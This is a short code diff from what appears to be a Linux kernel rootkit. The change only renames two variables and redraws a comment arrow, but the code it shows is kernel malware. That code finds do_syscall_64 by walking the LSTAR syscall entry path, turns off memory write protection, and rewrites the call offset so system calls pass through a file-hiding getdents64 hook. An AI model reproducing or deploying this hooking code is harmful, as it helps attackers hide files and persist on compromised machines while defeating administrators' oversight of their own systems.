@@ -24,8 +24,8 @@ extern rootkit_t rootkit;
 
 //Idea: build path from entry_SYSCALL_64_trampoline to do_syscall64 by gathering addresses piece by piece
 //(1) JMP_NOSPEC %rdi -> (2) [entry_SYSCALL_64_stage2] jmp entry_SYSCALL_64_after_hwframe -> (3) [entry_SYSCALL_64] call do_syscall_64
-//                                     |                                                  |====>
-//                               can be skipped =========================================/ 
+//                                     ||                                                 ||=====>
+//                               can be skipped ==========================================// 
 
 //sign-extended (0x48 REX.W) mov rdi, imm
 static const char *movSignExtended = "\x48\xc7\xc7";
@@ -42,7 +42,7 @@ void g7_syscall_64(unsigned long, struct pt_regs *);
 void (*do_syscall_64)(unsigned long, struct pt_regs *);
 void check_getdents64(void);
 static char *syscall_64_ptr;
-static unsigned long oldOff;
+static unsigned long old_off;
 
 void
 hide_files_lstar(void)
@@ -57,11 +57,11 @@ hide_files_lstar(void)
 
     //Calculate new call offset to our function
     //newOff = g7_syscall_64_addr - nextOpcodeAddr
-    unsigned long newOff = (unsigned long)check_getdents64 - ((unsigned long)syscall_64_ptr + 5);
+    unsigned long new_off = (unsigned long)check_getdents64 - ((unsigned long)syscall_64_ptr + 5);
 
     disable_protection();
     memcpy((void *)check_getdents64, "\x90\x90\x90\x90\x90", 5);
-    memcpy((syscall_64_ptr + 1), &newOff, 4);
+    memcpy((syscall_64_ptr + 1), &new_off, 4);
     enable_protection();
 
     hexdump((char *)check_getdents64, 32);
@@ -71,7 +71,7 @@ void
 unhide_files_lstar(void)
 {
     disable_protection();
-    memcpy((syscall_64_ptr + 1), &oldOff, 4);
+    memcpy((syscall_64_ptr + 1), &old_off, 4);
     enable_protection();
     
     if ((atomic_read(&syscall64_count)) > 0)
@@ -136,7 +136,7 @@ find_do_syscall_64(char *lstar_addr)
         return NULL;
 
     //Get offset from memory
-    unsigned long syscall64_off = oldOff = mem_offset(syscall64_call_ptr + 1); //1 byte offset to skip call opcode
+    unsigned long syscall64_off = old_off = mem_offset(syscall64_call_ptr + 1); //1 byte offset to skip call opcode
 
     //Store correct address of do_syscall_64
     //Offset relative to _next_ instruction -> e8 xx xx xx xx -> 5 bytes
